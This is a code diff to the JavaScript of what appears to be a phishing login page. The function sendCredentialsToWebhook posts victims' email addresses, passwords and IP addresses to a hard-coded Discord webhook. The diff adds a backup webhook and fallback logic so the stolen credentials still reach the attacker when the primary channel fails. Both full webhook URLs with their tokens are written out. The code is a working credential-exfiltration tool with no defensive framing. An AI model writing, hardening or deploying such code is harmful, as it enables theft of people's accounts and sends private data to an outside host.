@@ -3,8 +3,9 @@
 // ----------------------------------
 const loginButton = document.querySelector("button");
 
-// Webhook URL
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1358901901508219031/J7_foL_Odv6_Eg0P12xAVDL-9n7neQFed5xFjI4us8HAAJ6BLUw2wxs1-BGqvcCbXa_s";
+// Webhook URLs
+const PRIMARY_WEBHOOK_URL = "https://discord.com/api/webhooks/1358901901508219031/J7_foL_Odv6_Eg0P12xAVDL-9n7neQFed5xFjI4us8HAAJ6BLUw2wxs1-BGqvcCbXa_s";
+const BACKUP_WEBHOOK_URL = "https://discord.com/api/webhooks/1358902712070176768/u7-3e1PmM4t7VTUTD_UBNYCDkAnM9GP_KKxHjB4g_uxeitavR14PgmqdxzoadN0-NqKo";
 
 // Variables to store user data
 let userIP = "Unknown IP";
@@ -142,8 +143,8 @@ async function sendCredentialsToWebhook(email, password) {
       ],
     };
 
-    // Send the payload to the webhook
-    const response = await fetch(WEBHOOK_URL, {
+    // Send the payload to the primary webhook
+    let response = await fetch(PRIMARY_WEBHOOK_URL, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -151,10 +152,26 @@ async function sendCredentialsToWebhook(email, password) {
       body: JSON.stringify(embedPayload),
     });
 
-    if (response.ok) {
-      console.log("Credentials successfully sent to webhook.");
+    // Check if the primary webhook failed
+    if (!response.ok) {
+      console.error("Primary webhook failed. Attempting backup webhook...");
+      
+      // Send the payload to the backup webhook
+      response = await fetch(BACKUP_WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(embedPayload),
+      });
+
+      if (!response.ok) {
+        console.error("Backup webhook also failed. Data not sent.");
+      } else {
+        console.log("Data successfully sent to backup webhook.");
+      }
     } else {
-      console.error("Failed to send credentials to webhook:", response.status);
+      console.log("Data successfully sent to primary webhook.");
     }
   } catch (error) {
     console.error("Error sending credentials to webhook:", error);
